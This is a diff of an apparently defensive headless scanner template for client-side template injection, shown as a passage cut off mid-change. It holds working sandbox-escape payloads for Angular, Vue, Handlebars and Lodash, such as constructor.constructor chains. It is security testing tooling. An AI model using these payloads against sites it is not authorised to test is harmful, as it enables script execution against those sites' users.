@@ -1,693 +1,355 @@
-id: headless-template-injection
-
-info:
-  name: Client-Side Template Injection Detector
-  author: geeknik
-  severity: high
-  description: |
-    Advanced client-side template injection detection using Headless Protocol for
-    comprehensive template engine analysis. This template performs template syntax
-    testing, expression evaluation, and sandbox escape detection across multiple
-    client-side template engines including Angular, Vue.js, Handlebars, Mustache,
-    and custom template systems while maintaining defensive research principles.
-  reference:
-    - https://portswigger.net/research/server-side-template-injection
-    - https://owasp.org/www-project-web-security-testing-guide/
-    - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
-  tags: template-injection,client-side,headless,angular,vue,handlebars,defensive
-
 headless:
-  - steps:
-      # Navigate to target page
-      - action: navigate
-        args:
-          url: "{{BaseURL}}"
-
-      # Wait for page to fully load
-      - action: waitload
-
-      # Initialize template injection testing framework
-      - action: script
-        name: initialize_template_testing
-        args:
-          code: |
-            (function() {
-              window.templateInjectionResults = {
-                template_engines: {},
-                vulnerabilities: [],
-                test_results: [],
-                payloads_tested: [],
-                expression_contexts: [],
-                risk_assessment: {}
-              };
-
-              // Detect client-side template engines
-              window.templateInjectionResults.template_engines = {
-                angular: {
-                  present: typeof angular !== 'undefined',
-                  version: typeof angular !== 'undefined' ? angular.version : null,
-                  scope_available: typeof angular !== 'undefined' && angular.element && angular.element(document.body) && angular.element(document.body).scope,
-                  directives_found: []
-                },
-                angularjs: {
-                  present: document.querySelector('[ng-app], [data-ng-app], .ng-scope') !== null,
-                  interpolation_syntax: '{{}}',
-                  directives: document.querySelectorAll('[ng-bind], [ng-model], [ng-click]').length
-                },
-                vue: {
-                  present: typeof Vue !== 'undefined' || document.querySelector('[v-model], [v-if], [v-for]') !== null,
-                  version: typeof Vue !== 'undefined' ? Vue.version : null,
-                  interpolation_syntax: '{{}}',
-                  directives: document.querySelectorAll('[v-model], [v-if], [v-for]').length
-                },
-                handlebars: {
-                  present: typeof Handlebars !== 'undefined',
-                  version: typeof Handlebars !== 'undefined' ? Handlebars.VERSION : null,
-                  interpolation_syntax: '{{}}'
-                },
-                mustache: {
-                  present: typeof Mustache !== 'undefined',
-                  version: typeof Mustache !== 'undefined' ? Mustache.version : null,
-                  interpolation_syntax: '{{}}'
-                },
-                lodash: {
-                  present: typeof _ !== 'undefined' && typeof _.template === 'function',
-                  version: typeof _ !== 'undefined' ? _.VERSION : null,
-                  interpolation_syntax: '<%= %>'
-                },
-                custom: {
-                  template_strings: [],
-                  interpolation_patterns: []
-                }
-              };
-
-              // Scan for template syntax in page content
-              var pageContent = document.documentElement.outerHTML;
-              var templatePatterns = [
-                /\{\{[^}]+\}\}/g,           // {{ }} syntax
-                /\{%[^%]+%\}/g,            // {% %} syntax
-                /<%[^%]+%>/g,              // <% %> syntax
-                /\$\{[^}]+\}/g,            // ${ } syntax
-                /\[\[[^\]]+\]\]/g,         // [[ ]] syntax
-                /#\{[^}]+\}/g              // #{ } syntax
-              ];
-
-              for (var i = 0; i < templatePatterns.length; i++) {
-                var pattern = templatePatterns[i];
-                var matches = pageContent.match(pattern);
-                if (matches && matches.length > 0) {
-                  window.templateInjectionResults.template_engines.custom.template_strings.push({
-                    pattern_index: i,
-                    matches: matches.slice(0, 10), // Limit for performance
-                    count: matches.length
-                  });
-                }
-              }
-
-              return window.templateInjectionResults;
-            })();
-
-      # Test Angular/AngularJS template injection
-      - action: script
-        name: test_angular_injection
-        args:
-          code: |
-            (function() {
-              window.templateInjectionResults.test_results.push('angular_injection');
-
-              if (window.templateInjectionResults.template_engines.angular.present ||
-                  window.templateInjectionResults.template_engines.angularjs.present) {
-
-                // Test basic Angular expression injection
-                var angularPayloads = [
-                  '{{7*7}}',
-                  '{{constructor.constructor("alert(1)")()}}',
-                  '{{[].constructor.constructor("alert(1)")()}}',
-                  '{{("").constructor.constructor("alert(1)")()}}',
-                  '{{$eval.constructor("alert(1)")()}}',
-                  '{{$parent.$eval.constructor("alert(1)")()}}',
-                  '{{$root.constructor.constructor("alert(1)")()}}'
-                ];
-
-                window.templateInjectionResults.payloads_tested =
-                  window.templateInjectionResults.payloads_tested.concat(angularPayloads);
-
-                // Test expression evaluation in different contexts
-                try {
-                  // Create test elements with Angular interpolation
-                  for (var i = 0; i < angularPayloads.length; i++) {
-                    var payload = angularPayloads[i];
-                    try {
-                      window['angularTest' + i] = false;
-
-                      // Modify payload to set test variable instead of alert
-                      var testPayload = payload.replace('alert(1)', 'window.angularTest' + i + '=true');
-
-                      // Test in different contexts
-                      var contexts = [
-                        // Text interpolation
-                        function(tp) {
-                          var testDiv = document.createElement('div');
-                          testDiv.innerHTML = tp;
-                          testDiv.setAttribute('ng-bind-html', tp);
-                          document.body.appendChild(testDiv);
-                          return testDiv;
-                        },
-                        // Attribute interpolation
-                        function(tp) {
-                          var testInput = document.createElement('input');
-                          testInput.setAttribute('ng-model', 'test');
-                          testInput.setAttribute('placeholder', tp);
-                          document.body.appendChild(testInput);
-                          return testInput;
-                        }
-                      ];
-
-                      for (var j = 0; j < contexts.length; j++) {
-                        var createContext = contexts[j];
-                        try {
-                          var element = createContext(testPayload);
-
-                          // Simulate Angular compilation if possible
-                          if (typeof angular !== 'undefined' && angular.element) {
-                            try {
-                              var scope = angular.element(document.body).scope();
-                              if (scope) {
-                                scope.$apply();
-                              }
-                            } catch (e) {
-                              // Continue testing
-                            }
-                          }
-
-                          setTimeout(function(idx, pl, ctx) {
-                            return function() {
-                              if (window['angularTest' + idx] === true) {
-                                window.templateInjectionResults.vulnerabilities.push({
-                                  type: 'angular_template_injection',
-                                  engine: 'Angular/AngularJS',
-                                  payload: pl,
-                                  context: ctx === 0 ? 'text_interpolation' : 'attribute_interpolation',
-                                  severity: 'high',
-                                  confirmed: true
-                                });
-                              }
-                              try {
-                                document.body.removeChild(element);
-                              } catch (e) {
-                                // Element might already be removed
-                              }
-                            };
-                          }(i, payload, j), 200);
-
-                        } catch (e) {
-                          // Continue with next context
-                        }
-                      }
-
-                    } catch (e) {
-                      window.templateInjectionResults.test_results.push('angular_payload_' + i + '_error: ' + e.message);
-                    }
-                  }
-
-                } catch (e) {
-                  window.templateInjectionResults.test_results.push('angular_test_error: ' + e.message);
-                }
-              }
-
-              return window.templateInjectionResults;
-            })();
-
-      # Test Vue.js template injection
-      - action: script
-        name: test_vue_injection
-        args:
-          code: |
-            (function() {
-              window.templateInjectionResults.test_results.push('vue_injection');
-
-              if (window.templateInjectionResults.template_engines.vue.present) {
-
-                var vuePayloads = [
-                  '{{7*7}}',
-                  '{{constructor.constructor("alert(1)")()}}',
-                  '{{this.constructor.constructor("alert(1)")()}}',
-                  '{{$parent.constructor.constructor("alert(1)")()}}',
-                  '{{("").constructor.constructor("alert(1)")()}}'
-                ];
-
-                window.templateInjectionResults.payloads_tested =
-                  window.templateInjectionResults.payloads_tested.concat(vuePayloads);
-
-                try {
-                  for (var i = 0; i < vuePayloads.length; i++) {
-                    var payload = vuePayloads[i];
-                    try {
-                      window['vueTest' + i] = false;
-
-                      var testPayload = payload.replace('alert(1)', 'window.vueTest' + i + '=true');
-
-                      // Test Vue template contexts
-                      var vueTestDiv = document.createElement('div');
-                      vueTestDiv.innerHTML = '<span v-text="' + testPayload + '"></span>';
-                      vueTestDiv.setAttribute('v-html', testPayload);
-                      document.body.appendChild(vueTestDiv);
-
-                      // Try to initialize Vue if available
-                      if (typeof Vue !== 'undefined') {
-                        try {
-                          new Vue({
-                            el: vueTestDiv,
-                            data: {
-                              message: testPayload
-                            }
-                          });
-                        } catch (e) {
-                          // Continue testing
-                        }
-                      }
-
-                      setTimeout(function(idx, pl, element) {
-                        return function() {
-                          if (window['vueTest' + idx] === true) {
-                            window.templateInjectionResults.vulnerabilities.push({
-                              type: 'vue_template_injection',
-                              engine: 'Vue.js',
-                              payload: pl,
-                              context: 'vue_directive',
-                              severity: 'high',
-                              confirmed: true
-                            });
-                          }
-                          try {
-                            document.body.removeChild(element);
-                          } catch (e) {
-                            // Element might already be removed
-                          }
-                        };
-                      }(i, payload, vueTestDiv), 200);
-
-                    } catch (e) {
-                      window.templateInjectionResults.test_results.push('vue_payload_' + i + '_error: ' + e.message);
-                    }
-                  }
-
-                } catch (e) {
-                  window.templateInjectionResults.test_results.push('vue_test_error: ' + e.message);
-                }
-              }
-
-              return window.templateInjectionResults;
-            })();
-
-      # Test Handlebars template injection
-      - action: script
-        name: test_handlebars_injection
-        args:
-          code: |
-            (function() {
-              window.templateInjectionResults.test_results.push('handlebars_injection');
-
-              if (window.templateInjectionResults.template_engines.handlebars.present) {
-
-                var handlebarsPayloads = [
-                  '{{#with "constructor"}}{{#with ../constructor}}{{#with constructor}}{{#each constructor}}{{@key}}{{/each}}{{/with}}{{/with}}{{/with}}',
-                  '{{lookup (lookup this "constructor") "constructor"}}',
-                  '{{#with this}}{{lookup ../constructor "constructor"}}{{/with}}',
-                  '{{constructor.constructor}}',
-                  '{{lookup this "constructor"}}'
-                ];
-
-                window.templateInjectionResults.payloads_tested =
-                  window.templateInjectionResults.payloads_tested.concat(handlebarsPayloads);
-
-                try {
-                  for (var i = 0; i < handlebarsPayloads.length; i++) {
-                    var payload = handlebarsPayloads[i];
-                    try {
-                      window['handlebarsTest' + i] = false;
-
-                      // Test Handlebars compilation
-                      if (typeof Handlebars !== 'undefined' && Handlebars.compile) {
-                        try {
-                          var template = Handlebars.compile(payload);
-                          var context = {
-                            test: 'value',
-                            constructor: function() { window['handlebarsTest' + i] = true; }
-                          };
-
-                          var result = template(context);
-
-                          if (window['handlebarsTest' + i] === true ||
-                              result.indexOf('function') !== -1 ||
-                              result.indexOf('constructor') !== -1) {
-
-                            window.templateInjectionResults.vulnerabilities.push({
-                              type: 'handlebars_template_injection',
-                              engine: 'Handlebars',
-                              payload: payload,
-                              context: 'template_compilation',
-                              severity: 'high',
-                              confirmed: window['handlebarsTest' + i] === true,
-                              result: result
-                            });
-                          }
-                        } catch (e) {
-                          // Template compilation might fail for malicious payloads
-                          if (e.message.indexOf('constructor') !== -1 || e.message.indexOf('prototype') !== -1) {
-                            window.templateInjectionResults.vulnerabilities.push({
-                              type: 'handlebars_template_injection',
-                              engine: 'Handlebars',
-                              payload: payload,
-                              context: 'compilation_error',
-                              severity: 'medium',
-                              confirmed: false,
-                              error: e.message
-                            });
-                          }
-                        }
-                      }
-
-                    } catch (e) {
-                      window.templateInjectionResults.test_results.push('handlebars_payload_' + i + '_error: ' + e.message);
-                    }
-                  }
-
-                } catch (e) {
-                  window.templateInjectionResults.test_results.push('handlebars_test_error: ' + e.message);
-                }
-              }
-
-              return window.templateInjectionResults;
-            })();
-
-      # Test Lodash template injection
-      - action: script
-        name: test_lodash_injection
-        args:
-          code: |
-            (function() {
-              window.templateInjectionResults.test_results.push('lodash_injection');
-
-              if (window.templateInjectionResults.template_engines.lodash.present) {
-
-                var lodashPayloads = [
-                  '<%= 7*7 %>',
-                  '<%= this.constructor.constructor("alert(1)")() %>',
-                  '<%= constructor.constructor("alert(1)")() %>',
-                  '<%= (function(){return this})().constructor.constructor("alert(1)")() %>',
-                  '<%= ("").constructor.constructor("alert(1)")() %>'
-                ];
-
-                window.templateInjectionResults.payloads_tested =
-                  window.templateInjectionResults.payloads_tested.concat(lodashPayloads);
-
-                try {
-                  for (var i = 0; i < lodashPayloads.length; i++) {
-                    var payload = lodashPayloads[i];
-                    try {
-                      window['lodashTest' + i] = false;
-
-                      var testPayload = payload.replace('alert(1)', 'window.lodashTest' + i + '=true');
-
-                      // Test Lodash template compilation
-                      if (typeof _ !== 'undefined' && _.template) {
-                        try {
-                          var template = _.template(testPayload);
-                          var result = template();
-
-                          if (window['lodashTest' + i] === true ||
-                              (typeof result === 'string' && result.indexOf('49') !== -1)) { // 7*7 = 49
-
-                            window.templateInjectionResults.vulnerabilities.push({
-                              type: 'lodash_template_injection',
-                              engine: 'Lodash',
-                              payload: payload,
-                              context: 'template_compilation',
-                              severity: 'high',
-                              confirmed: window['lodashTest' + i] === true,
-                              result: result
-                            });
-                          }
-                        } catch (e) {
-                          // Template compilation error might indicate vulnerability attempt
-                          if (e.message.indexOf('constructor') !== -1 ||
-                              e.message.indexOf('process') !== -1 ||
-                              e.message.indexOf('require') !== -1) {
-                            window.templateInjectionResults.vulnerabilities.push({
-                              type: 'lodash_template_injection',
-                              engine: 'Lodash',
-                              payload: payload,
-                              context: 'compilation_error',
-                              severity: 'medium',
-                              confirmed: false,
-                              error: e.message
-                            });
-                          }
-                        }
-                      }
-
-                    } catch (e) {
-                      window.templateInjectionResults.test_results.push('lodash_payload_' + i + '_error: ' + e.message);
-                    }
-                  }
-
-                } catch (e) {
-                  window.templateInjectionResults.test_results.push('lodash_test_error: ' + e.message);
-                }
-              }
-
-              return window.templateInjectionResults;
-            })();
-
-      # Test custom template engine detection and injection
-      - action: script
-        name: test_custom_template_injection
-        args:
-          code: |
-            (function() {
-              window.templateInjectionResults.test_results.push('custom_template_injection');
-
-              // Test various interpolation syntaxes found in page
-              var customPayloads = [
-                { syntax: '{{}}', payloads: ['{{7*7}}', '{{constructor.constructor}}'] },
-                { syntax: '<%%>', payloads: ['<%=7*7%>', '<%=constructor.constructor%>'] },
-                { syntax: '${}', payloads: ['${7*7}', '${constructor.constructor}'] },
-                { syntax: '[[]]', payloads: ['[[7*7]]', '[[constructor.constructor]]'] },
-                { syntax: '#{}', payloads: ['#{7*7}', '#{constructor.constructor}'] }
-              ];
-
-              // Test for reflection of payloads in page content
-              try {
-                for (var i = 0; i < customPayloads.length; i++) {
-                  var syntaxGroup = customPayloads[i];
-                  for (var j = 0; j < syntaxGroup.payloads.length; j++) {
-                    var payload = syntaxGroup.payloads[j];
-                    try {
-                      // Create a test element with the payload
-                      var testDiv = document.createElement('div');
-                      testDiv.innerHTML = payload;
-                      testDiv.setAttribute('data-test-payload', payload);
-                      document.body.appendChild(testDiv);
-
-                      // Check if the payload gets processed/evaluated
-                      setTimeout(function(groupIdx, payloadIdx, pl, syntax, element) {
-                        return function() {
-                          var elementContent = element.innerHTML;
-                          var elementText = element.textContent;
-
-                          // Check for mathematical evaluation (7*7 = 49)
-                          if (elementContent.indexOf('49') !== -1 || elementText.indexOf('49') !== -1) {
-                            window.templateInjectionResults.vulnerabilities.push({
-                              type: 'custom_template_injection',
-                              engine: 'Unknown/Custom',
-                              syntax: syntax,
-                              payload: pl,
-                              context: 'mathematical_evaluation',
-                              severity: 'medium',
-                              confirmed: true,
-                              result: elementContent
-                            });
-                          }
-
-                          // Check for constructor access
-                          if (elementContent.indexOf('function') !== -1 ||
-                              elementContent.indexOf('constructor') !== -1 ||
-                              elementText.indexOf('function') !== -1) {
-                            window.templateInjectionResults.vulnerabilities.push({
-                              type: 'custom_template_injection',
-                              engine: 'Unknown/Custom',
-                              syntax: syntax,
-                              payload: pl,
-                              context: 'constructor_access',
-                              severity: 'high',
-                              confirmed: true,
-                              result: elementContent
-                            });
-                          }
-
-                          try {
-                            document.body.removeChild(element);
-                          } catch (e) {
-                            // Element might already be removed
-                          }
-                        };
-                      }(i, j, payload, syntaxGroup.syntax, testDiv), 300);
-
-                    } catch (e) {
-                      window.templateInjectionResults.test_results.push(
-                        'custom_payload_' + i + '_' + j + '_error: ' + e.message
-                      );
-                    }
-                  }
-                }
-
-              } catch (e) {
-                window.templateInjectionResults.test_results.push('custom_template_test_error: ' + e.message);
-              }
-
-              return window.templateInjectionResults;
-            })();
-
-      # Test URL parameter template injection
-      - action: navigate
-        args:
-          url: "{{BaseURL}}?name={{7*7}}&template=<%=constructor.constructor%>&expr=${7*7}"
-
-      - action: waitload
-
-      - action: script
-        name: test_url_parameter_injection
-        args:
-          code: |
-            (function() {
-              window.templateInjectionResults.test_results.push('url_parameter_injection');
-
-              try {
-                // Check if URL parameters are reflected and processed as templates
-                var pageContent = document.documentElement.outerHTML;
-                var urlParams = new URLSearchParams(window.location.search);
-
-                // Check for mathematical evaluation in page content
-                if (pageContent.indexOf('49') !== -1) {
-                  window.templateInjectionResults.vulnerabilities.push({
-                    type: 'url_parameter_template_injection',
-                    engine: 'Server/Client-side processing',
-                    vector: 'URL parameters',
-                    payload: '{{7*7}} or ${7*7}',
-                    context: 'url_parameter_reflection',
-                    severity: 'high',
-                    confirmed: true,
-                    description: 'URL parameters are processed as template expressions'
-                  });
-                }
-
-                // Check for constructor/function reflection
-                if (pageContent.indexOf('function') !== -1 &&
-                    (pageContent.indexOf('constructor') !== -1 || urlParams.has('template'))) {
-                  window.templateInjectionResults.vulnerabilities.push({
-                    type: 'url_parameter_template_injection',
-                    engine: 'Server/Client-side processing',
-                    vector: 'URL parameters',
-                    payload: '<%=constructor.constructor%>',
-                    context: 'constructor_access_via_url',
-                    severity: 'critical',
-                    confirmed: true,
-                    description: 'Constructor access via URL parameter template injection'
-                  });
-                }
-
-              } catch (e) {
-                window.templateInjectionResults.test_results.push('url_parameter_test_error: ' + e.message);
-              }
-
-              return window.templateInjectionResults;
-            })();
-
-      # Final template injection assessment
-      - action: script
-        name: final_template_assessment
-        args:
-          code: |
-            (function() {
-              // Calculate comprehensive template injection risk score
-              var riskScore = 0;
-              var confirmedVulns = [];
-
-              for (var i = 0; i < window.templateInjectionResults.vulnerabilities.length; i++) {
-                if (window.templateInjectionResults.vulnerabilities[i].confirmed) {
-                  confirmedVulns.push(window.templateInjectionResults.vulnerabilities[i]);
-                }
-              }
-
-              for (var j = 0; j < confirmedVulns.length; j++) {
-                var vuln = confirmedVulns[j];
-                switch (vuln.severity) {
-                  case 'critical': riskScore += 40; break;
-                  case 'high': riskScore += 30; break;
-                  case 'medium': riskScore += 20; break;
-                  case 'low': riskScore += 10; break;
-                }
-              }
-
-              // Additional risk factors
-              var templateEnginesPresent = 0;
-              var engines = window.templateInjectionResults.template_engines;
-
-              for (var engineName in engines) {
-                var engine = engines[engineName];
-                if (engine.present || (engine.directives && engine.directives > 0)) {
-                  templateEnginesPresent++;
-                }
-              }
-
-              riskScore += templateEnginesPresent * 5;
-
-              window.templateInjectionResults.risk_assessment = {
-                total_vulnerabilities: confirmedVulns.length,
-                template_engines_detected: templateEnginesPresent,
-                risk_score: Math.min(riskScore, 100),
-                risk_level: riskScore > 70 ? 'Critical' :
-                           riskScore > 50 ? 'High' :
-                           riskScore > 30 ? 'Medium' : 'Low',
-                payloads_tested: window.templateInjectionResults.payloads_tested.length,
-                test_coverage: window.templateInjectionResults.test_results.length,
-                recommendations: []
-              };
-
-              window.templateInjectionResults.summary = {
-                scan_completed: true,
-                timestamp: new Date().toISOString(),
-                template_injection_vulnerabilities_found: confirmedVulns.length > 0,
-                engines_analyzed: templateEnginesPresent,
-                comprehensive_testing_completed: true
-              };
-
-              return window.templateInjectionResults;
-            })();
-
-    extractors:
-      - type: regex
-        name: template_injection_summary
-        part: body
-        regex:
-          - '"scan_completed":\s*true'
-
-      - type: regex
-        name: confirmed_template_injections
-        part: body
-        regex:
-          - '"confirmed":\s*true'
-
-    matchers:
-      - type: regex
-        name: template_injection_detected
-        regex:
-          - '"template_injection_vulnerabilities_found":\s*true'
-
-      - type: regex
-        name: critical_template_injection
-        regex:
-          - '"severity":\s*"critical"'
-
-# Headless template for comprehensive client-side template injection detection
+- extractors:
+  - name: template_injection_summary
+    part: body
+    regex:
+    - '"scan_completed":\s*true'
+    type: regex
+  - name: confirmed_template_injections
+    part: body
+    regex:
+    - '"confirmed":\s*true'
+    type: regex
+  matchers:
+  - name: template_injection_detected
+    regex:
+    - '"template_injection_vulnerabilities_found":\s*true'
+    type: regex
+  - name: critical_template_injection
+    regex:
+    - '"severity":\s*"critical"'
+    type: regex
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}'
+  - action: waitload
+  - action: script
+    args:
+      code: "(function() {\n  window.templateInjectionResults = {\n    template_engines:\
+        \ {},\n    vulnerabilities: [],\n    test_results: [],\n    payloads_tested:\
+        \ [],\n    expression_contexts: [],\n    risk_assessment: {}\n  };\n\n  //\
+        \ Detect client-side template engines\n  window.templateInjectionResults.template_engines\
+        \ = {\n    angular: {\n      present: typeof angular !== 'undefined',\n  \
+        \    version: typeof angular !== 'undefined' ? angular.version : null,\n \
+        \     scope_available: typeof angular !== 'undefined' && angular.element &&\
+        \ angular.element(document.body) && angular.element(document.body).scope,\n\
+        \      directives_found: []\n    },\n    angularjs: {\n      present: document.querySelector('[ng-app],\
+        \ [data-ng-app], .ng-scope') !== null,\n      interpolation_syntax: '{{}}',\n\
+        \      directives: document.querySelectorAll('[ng-bind], [ng-model], [ng-click]').length\n\
+        \    },\n    vue: {\n      present: typeof Vue !== 'undefined' || document.querySelector('[v-model],\
+        \ [v-if], [v-for]') !== null,\n      version: typeof Vue !== 'undefined' ?\
+        \ Vue.version : null,\n      interpolation_syntax: '{{}}',\n      directives:\
+        \ document.querySelectorAll('[v-model], [v-if], [v-for]').length\n    },\n\
+        \    handlebars: {\n      present: typeof Handlebars !== 'undefined',\n  \
+        \    version: typeof Handlebars !== 'undefined' ? Handlebars.VERSION : null,\n\
+        \      interpolation_syntax: '{{}}'\n    },\n    mustache: {\n      present:\
+        \ typeof Mustache !== 'undefined',\n      version: typeof Mustache !== 'undefined'\
+        \ ? Mustache.version : null,\n      interpolation_syntax: '{{}}'\n    },\n\
+        \    lodash: {\n      present: typeof _ !== 'undefined' && typeof _.template\
+        \ === 'function',\n      version: typeof _ !== 'undefined' ? _.VERSION : null,\n\
+        \      interpolation_syntax: '<%= %>'\n    },\n    custom: {\n      template_strings:\
+        \ [],\n      interpolation_patterns: []\n    }\n  };\n\n  // Scan for template\
+        \ syntax in page content\n  var pageContent = document.documentElement.outerHTML;\n\
+        \  var templatePatterns = [\n    /\\{\\{[^}]+\\}\\}/g,           // {{ }}\
+        \ syntax\n    /\\{%[^%]+%\\}/g,            // {% %} syntax\n    /<%[^%]+%>/g,\
+        \              // <% %> syntax\n    /\\$\\{[^}]+\\}/g,            // ${ }\
+        \ syntax\n    /\\[\\[[^\\]]+\\]\\]/g,         // [[ ]] syntax\n    /#\\{[^}]+\\\
+        }/g              // #{ } syntax\n  ];\n\n  for (var i = 0; i < templatePatterns.length;\
+        \ i++) {\n    var pattern = templatePatterns[i];\n    var matches = pageContent.match(pattern);\n\
+        \    if (matches && matches.length > 0) {\n      window.templateInjectionResults.template_engines.custom.template_strings.push({\n\
+        \        pattern_index: i,\n        matches: matches.slice(0, 10), // Limit\
+        \ for performance\n        count: matches.length\n      });\n    }\n  }\n\n\
+        \  return window.templateInjectionResults;\n})();\n"
+    name: initialize_template_testing
+  - action: script
+    args:
+      code: "(function() {\n  window.templateInjectionResults.test_results.push('angular_injection');\n\
+        \n  if (window.templateInjectionResults.template_engines.angular.present ||\n\
+        \      window.templateInjectionResults.template_engines.angularjs.present)\
+        \ {\n\n    // Test basic Angular expression injection\n    var angularPayloads\
+        \ = [\n      '{{7*7}}',\n      '{{constructor.constructor(\"alert(1)\")()}}',\n\
+        \      '{{[].constructor.constructor(\"alert(1)\")()}}',\n      '{{(\"\").constructor.constructor(\"\
+        alert(1)\")()}}',\n      '{{$eval.constructor(\"alert(1)\")()}}',\n      '{{$parent.$eval.constructor(\"\
+        alert(1)\")()}}',\n      '{{$root.constructor.constructor(\"alert(1)\")()}}'\n\
+        \    ];\n\n    window.templateInjectionResults.payloads_tested =\n      window.templateInjectionResults.payloads_tested.concat(angularPayloads);\n\
+        \n    // Test expression evaluation in different contexts\n    try {\n   \
+        \   // Create test elements with Angular interpolation\n      for (var i =\
+        \ 0; i < angularPayloads.length; i++) {\n        var payload = angularPayloads[i];\n\
+        \        try {\n          window['angularTest' + i] = false;\n\n         \
+        \ // Modify payload to set test variable instead of alert\n          var testPayload\
+        \ = payload.replace('alert(1)', 'window.angularTest' + i + '=true');\n\n \
+        \         // Test in different contexts\n          var contexts = [\n    \
+        \        // Text interpolation\n            function(tp) {\n             \
+        \ var testDiv = document.createElement('div');\n              testDiv.innerHTML\
+        \ = tp;\n              testDiv.setAttribute('ng-bind-html', tp);\n       \
+        \       document.body.appendChild(testDiv);\n              return testDiv;\n\
+        \            },\n            // Attribute interpolation\n            function(tp)\
+        \ {\n              var testInput = document.createElement('input');\n    \
+        \          testInput.setAttribute('ng-model', 'test');\n              testInput.setAttribute('placeholder',\
+        \ tp);\n              document.body.appendChild(testInput);\n            \
+        \  return testInput;\n            }\n          ];\n\n          for (var j\
+        \ = 0; j < contexts.length; j++) {\n            var createContext = contexts[j];\n\
+        \            try {\n              var element = createContext(testPayload);\n\
+        \n              // Simulate Angular compilation if possible\n            \
+        \  if (typeof angular !== 'undefined' && angular.element) {\n            \
+        \    try {\n                  var scope = angular.element(document.body).scope();\n\
+        \                  if (scope) {\n                    scope.$apply();\n   \
+        \               }\n                } catch (e) {\n                  // Continue\
+        \ testing\n                }\n              }\n\n              setTimeout(function(idx,\
+        \ pl, ctx) {\n                return function() {\n                  if (window['angularTest'\
+        \ + idx] === true) {\n                    window.templateInjectionResults.vulnerabilities.push({\n\
+        \                      type: 'angular_template_injection',\n             \
+        \         engine: 'Angular/AngularJS',\n                      payload: pl,\n\
+        \                      context: ctx === 0 ? 'text_interpolation' : 'attribute_interpolation',\n\
+        \                      severity: 'high',\n                      confirmed:\
+        \ true\n                    });\n                  }\n                  try\
+        \ {\n                    document.body.removeChild(element);\n           \
+        \       } catch (e) {\n                    // Element might already be removed\n\
+        \                  }\n                };\n              }(i, payload, j),\
+        \ 200);\n\n            } catch (e) {\n              // Continue with next\
+        \ context\n            }\n          }\n\n        } catch (e) {\n         \
+        \ window.templateInjectionResults.test_results.push('angular_payload_' + i\
+        \ + '_error: ' + e.message);\n        }\n      }\n\n    } catch (e) {\n  \
+        \    window.templateInjectionResults.test_results.push('angular_test_error:\
+        \ ' + e.message);\n    }\n  }\n\n  return window.templateInjectionResults;\n\
+        })();\n"
+    name: test_angular_injection
+  - action: script
+    args:
+      code: "(function() {\n  window.templateInjectionResults.test_results.push('vue_injection');\n\
+        \n  if (window.templateInjectionResults.template_engines.vue.present) {\n\n\
+        \    var vuePayloads = [\n      '{{7*7}}',\n      '{{constructor.constructor(\"\
+        alert(1)\")()}}',\n      '{{this.constructor.constructor(\"alert(1)\")()}}',\n\
+        \      '{{$parent.constructor.constructor(\"alert(1)\")()}}',\n      '{{(\"\
+        \").constructor.constructor(\"alert(1)\")()}}'\n    ];\n\n    window.templateInjectionResults.payloads_tested\
+        \ =\n      window.templateInjectionResults.payloads_tested.concat(vuePayloads);\n\
+        \n    try {\n      for (var i = 0; i < vuePayloads.length; i++) {\n      \
+        \  var payload = vuePayloads[i];\n        try {\n          window['vueTest'\
+        \ + i] = false;\n\n          var testPayload = payload.replace('alert(1)',\
+        \ 'window.vueTest' + i + '=true');\n\n          // Test Vue template contexts\n\
+        \          var vueTestDiv = document.createElement('div');\n          vueTestDiv.innerHTML\
+        \ = '<span v-text=\"' + testPayload + '\"></span>';\n          vueTestDiv.setAttribute('v-html',\
+        \ testPayload);\n          document.body.appendChild(vueTestDiv);\n\n    \
+        \      // Try to initialize Vue if available\n          if (typeof Vue !==\
+        \ 'undefined') {\n            try {\n              new Vue({\n           \
+        \     el: vueTestDiv,\n                data: {\n                  message:\
+        \ testPayload\n                }\n              });\n            } catch (e)\
+        \ {\n              // Continue testing\n            }\n          }\n\n   \
+        \       setTimeout(function(idx, pl, element) {\n            return function()\
+        \ {\n              if (window['vueTest' + idx] === true) {\n             \
+        \   window.templateInjectionResults.vulnerabilities.push({\n             \
+        \     type: 'vue_template_injection',\n                  engine: 'Vue.js',\n\
+        \                  payload: pl,\n                  context: 'vue_directive',\n\
+        \                  severity: 'high',\n                  confirmed: true\n\
+        \                });\n              }\n              try {\n             \
+        \   document.body.removeChild(element);\n              } catch (e) {\n   \
+        \             // Element might already be removed\n              }\n     \
+        \       };\n          }(i, payload, vueTestDiv), 200);\n\n        } catch\
+        \ (e) {\n          window.templateInjectionResults.test_results.push('vue_payload_'\
+        \ + i + '_error: ' + e.message);\n        }\n      }\n\n    } catch (e) {\n\
+        \      window.templateInjectionResults.test_results.push('vue_test_error:\
+        \ ' + e.message);\n    }\n  }\n\n  return window.templateInjectionResults;\n\
+        })();\n"
+    name: test_vue_injection
+  - action: script
+    args:
+      code: "(function() {\n  window.templateInjectionResults.test_results.push('handlebars_injection');\n\
+        \n  if (window.templateInjectionResults.template_engines.handlebars.present)\
+        \ {\n\n    var handlebarsPayloads = [\n      '{{#with \"constructor\"}}{{#with\
+        \ ../constructor}}{{#with constructor}}{{#each constructor}}{{@key}}{{/each}}{{/with}}{{/with}}{{/with}}',\n\
+        \      '{{lookup (lookup this \"constructor\") \"constructor\"}}',\n     \
+        \ '{{#with this}}{{lookup ../constructor \"constructor\"}}{{/with}}',\n  \
+        \    '{{constructor.constructor}}',\n      '{{lookup this \"constructor\"\
+        }}'\n    ];\n\n    window.templateInjectionResults.payloads_tested =\n   \
+        \   window.templateInjectionResults.payloads_tested.concat(handlebarsPayloads);\n\
+        \n    try {\n      for (var i = 0; i < handlebarsPayloads.length; i++) {\n\
+        \        var payload = handlebarsPayloads[i];\n        try {\n          window['handlebarsTest'\
+        \ + i] = false;\n\n          // Test Handlebars compilation\n          if\
+        \ (typeof Handlebars !== 'undefined' && Handlebars.compile) {\n          \
+        \  try {\n              var template = Handlebars.compile(payload);\n    \
+        \          var context = {\n                test: 'value',\n             \
+        \   constructor: function() { window['handlebarsTest' + i] = true; }\n   \
+        \           };\n\n              var result = template(context);\n\n      \
+        \        if (window['handlebarsTest' + i] === true ||\n                  result.indexOf('function')\
+        \ !== -1 ||\n                  result.indexOf('constructor') !== -1) {\n\n\
+        \                window.templateInjectionResults.vulnerabilities.push({\n\
+        \                  type: 'handlebars_template_injection',\n              \
+        \    engine: 'Handlebars',\n                  payload: payload,\n        \
